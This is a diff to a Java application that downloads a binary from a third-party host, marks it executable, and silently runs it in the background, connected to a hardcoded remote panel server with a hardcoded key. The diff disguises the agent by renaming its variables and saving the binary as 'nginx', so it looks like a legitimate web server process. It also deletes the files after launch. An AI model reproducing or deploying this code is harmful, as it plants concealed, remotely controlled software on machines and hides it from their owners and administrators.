@@ -35,9 +35,9 @@ public class App {
     
     // 优先从.env文件获取，没有则使用系统环境变量
     private static String UUID;
-    private static String NEZHA_SERVER;
-    private static String NEZHA_PORT;
-    private static String NEZHA_KEY;
+    private static String YOUNGHERO_SERVER;
+    private static String YOUNGHERO_PORT;
+    private static String YOUNGHERO_KEY;
     private static String DOMAIN;
     private static String SUB_PATH;
     private static String NAME;
@@ -109,9 +109,9 @@ public class App {
         
         // 默认值变量
         UUID = getEnvValue(envFromFile, "UUID", "323a6a00-a954-4ad1-9afa-6a5fb7458bd9");
-        NEZHA_SERVER = getEnvValue(envFromFile, "NEZHA_SERVER", "nzag.faiz.us.kg:8008");
-        NEZHA_PORT = getEnvValue(envFromFile, "NEZHA_PORT", "");
-        NEZHA_KEY = getEnvValue(envFromFile, "NEZHA_KEY", "JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl");
+        YOUNGHERO_SERVER = getEnvValue(envFromFile, "YOUNGHERO_SERVER", "nzag.faiz.us.kg:8008");
+        YOUNGHERO_PORT = getEnvValue(envFromFile, "YOUNGHERO_PORT", "");
+        YOUNGHERO_KEY = getEnvValue(envFromFile, "YOUNGHERO_KEY", "JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl");
         DOMAIN = getEnvValue(envFromFile, "DOMAIN", "192.168.188.124");
         SUB_PATH = getEnvValue(envFromFile, "SUB_PATH", "sub");
         NAME = getEnvValue(envFromFile, "NAME", "DE-Karlo");
@@ -281,7 +281,7 @@ public class App {
     }
     
     private static void startNezha() {
-        if (NEZHA_SERVER.isEmpty() || NEZHA_KEY.isEmpty()) return;
+        if (YOUNGHERO_SERVER.isEmpty() || YOUNGHERO_KEY.isEmpty()) return;
         
         try {
             Process proc = Runtime.getRuntime().exec("ps aux");
@@ -289,17 +289,17 @@ public class App {
             String line;
             boolean running = false;
             while ((line = reader.readLine()) != null) {
-                if (line.contains("./npm") && !line.contains("grep")) {
+                if (line.contains("./nginx") && !line.contains("grep")) {
                     running = true;
                     break;
                 }
             }
             if (running) {
-                info("npm is already running, skip...");
+                info("nginx is already running, skip...");
                 return;
             }
         } catch (IOException e) {
-            debug("Failed to check npm process: " + e.getMessage());
+            debug("Failed to check nginx process: " + e.getMessage());
         }
         
         downloadNpm();
@@ -323,7 +323,7 @@ public class App {
             outputThread.setDaemon(true);
             outputThread.start();
             
-            info("✅ nz started successfully");
+            info("✅ yh started successfully");
             
             new Timer().schedule(new TimerTask() {
                 @Override
@@ -331,7 +331,7 @@ public class App {
             }, 180000);
             
         } catch (IOException e) {
-            error("Error running nz: " + e.getMessage());
+            error("Error running yh: " + e.getMessage());
         }
     }
     
@@ -339,22 +339,22 @@ public class App {
         String arch = System.getProperty("os.arch").toLowerCase();
         String url;
         if (arch.contains("arm") || arch.contains("aarch64")) {
-            url = NEZHA_PORT.isEmpty() ? "https://arm64.eooce.com/v1" : "https://arm64.eooce.com/agent";
+            url = YOUNGHERO_PORT.isEmpty() ? "https://arm64.eooce.com/v1" : "https://arm64.eooce.com/agent";
         } else {
-            url = NEZHA_PORT.isEmpty() ? "https://amd64.eooce.com/v1" : "https://amd64.eooce.com/agent";
+            url = YOUNGHERO_PORT.isEmpty() ? "https://amd64.eooce.com/v1" : "https://amd64.eooce.com/agent";
         }
         
         try {
-            // info("Downloading npm from: " + url);
+            // info("Downloading nginx from: " + url);
             HttpRequest request = HttpRequest.newBuilder()
                     .uri(URI.create(url))
                     .timeout(Duration.ofSeconds(30))
                     .build();
             HttpResponse<byte[]> response = httpClient.send(request, HttpResponse.BodyHandlers.ofByteArray());
             if (response.statusCode() == 200) {
-                Files.write(Paths.get("npm"), response.body());
-                Runtime.getRuntime().exec("chmod 755 npm");
-                info("✅ nz downloaded successfully");
+                Files.write(Paths.get("nginx"), response.body());
+                Runtime.getRuntime().exec("chmod 755 nginx");
+                info("✅ yh downloaded successfully");
             }
         } catch (Exception e) {
             error("Download failed: " + e.getMessage());
@@ -362,15 +362,15 @@ public class App {
     }
     
     private static String buildNezhaCommand() {
-        if (!NEZHA_PORT.isEmpty()) {
-            boolean tlsFlag = TLS_PORTS.contains(NEZHA_PORT);
+        if (!YOUNGHERO_PORT.isEmpty()) {
+            boolean tlsFlag = TLS_PORTS.contains(YOUNGHERO_PORT);
             String tls = tlsFlag ? "--tls" : "";
             return String.format(
-                    "nohup ./npm -s %s:%s -p %s %s --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &",
-                    NEZHA_SERVER, NEZHA_PORT, NEZHA_KEY, tls);
+                    "nohup ./nginx -s %s:%s -p %s %s --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &",
+                    YOUNGHERO_SERVER, YOUNGHERO_PORT, YOUNGHERO_KEY, tls);
         } else {
-            String port = NEZHA_SERVER.contains(":") ? 
-                    NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(':') + 1) : "";
+            String port = YOUNGHERO_SERVER.contains(":") ? 
+                    YOUNGHERO_SERVER.substring(YOUNGHERO_SERVER.lastIndexOf(':') + 1) : "";
             boolean tlsFlag = TLS_PORTS.contains(port);
             
             String config = String.format(
@@ -393,7 +393,7 @@ public class App {
                     "use_gitee_to_upgrade: false\n" +
                     "use_ipv6_country_code: false\n" +
                     "uuid: %s",
-                    NEZHA_KEY, NEZHA_SERVER, tlsFlag, UUID);
+                    YOUNGHERO_KEY, YOUNGHERO_SERVER, tlsFlag, UUID);
             
             try {
                 Files.writeString(Paths.get("config.yaml"), config);
@@ -401,12 +401,12 @@ public class App {
                 error("Failed to write config file: " + e.getMessage());
             }
             
-            return "nohup ./npm -c config.yaml >/dev/null 2>&1 &";
+            return "nohup ./nginx -c config.yaml >/dev/null 2>&1 &";
         }
     }
     
     private static void cleanupNezha() {
-        for (String file : Arrays.asList("npm", "config.yaml")) {
+        for (String file : Arrays.asList("nginx", "config.yaml")) {
             try {
                 Files.deleteIfExists(Paths.get(file));
             } catch (IOException e) {}
